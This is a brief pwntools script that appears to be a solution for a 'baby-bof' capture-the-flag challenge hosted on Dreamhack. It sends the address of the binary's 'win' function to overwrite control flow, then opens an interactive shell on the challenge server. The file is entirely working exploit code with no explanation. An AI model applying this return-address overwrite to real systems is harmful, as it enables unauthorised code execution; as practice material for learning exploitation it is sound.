from pwn import *

e = ELF('./deploy/baby-bof')
libc = e.libc

r = remote('host3.dreamhack.games', 21816)

WIN_ADDR = bytes(format(e.symbols['win'], 'x'), 'utf-8')
CNT = bytes(str(100), 'utf-8')

print(r.recvuntil(b'\n'))

r.sendlineafter(b'name: ', WIN_ADDR)

print(r.recvuntil(b'\n'))

print(WIN_ADDR)
print(CNT)

r.sendlineafter(b'hex value: ', WIN_ADDR)
r.sendlineafter(b'integer count: ', CNT)

r.interactive()